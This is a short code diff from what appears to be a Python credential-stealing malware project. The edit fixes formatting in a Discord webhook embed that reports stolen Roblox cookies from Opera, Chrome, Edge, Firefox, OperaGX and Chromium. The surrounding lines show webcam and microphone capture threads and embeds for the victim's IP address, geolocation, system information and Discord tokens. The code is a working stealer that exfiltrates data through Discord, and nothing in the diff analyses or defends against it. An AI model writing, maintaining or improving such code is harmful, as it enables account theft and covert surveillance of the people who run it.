@@ -824,7 +824,7 @@ webcamthread=threading.Thread(target=webcam)
 micthread=threading.Thread(target=record_audio)
 
 geolocationembed=DiscordEmbed(title='IP and Geolocation Data',description=f'```IPv4: {ip4}```\n```IPv6: {ip6()}```\n```Latitude: {lat}```\n```Longitude: {long}```\n```City: {city}```\n```Region: {region}```\n```Country: {country}```\n```Postal Code: {postal}```\n```Timezone: {timezone}```\n```Router Orginisation: {org}```\n```Router Hostname: {hostname}```',color='fcba03')
-robloxembed=DiscordEmbed(title='Roblox Cookies',description=f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}\nOperaGX:```{roblogx}\nChromium:```{roblochromium}```',color='6f00ff')
+robloxembed=DiscordEmbed(title='Roblox Cookies',description=f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```\nOperaGX:```{roblogx}```\nChromium:```{roblochromium}```',color='6f00ff')
 sysembed=DiscordEmbed(title='System Information',description=f'### System Info:',color='ab222b')
 discordtokenembed= DiscordEmbed(title='Discord Token(s)',description='### Tokens:\n')
 discordtokeninfoembed= DiscordEmbed()
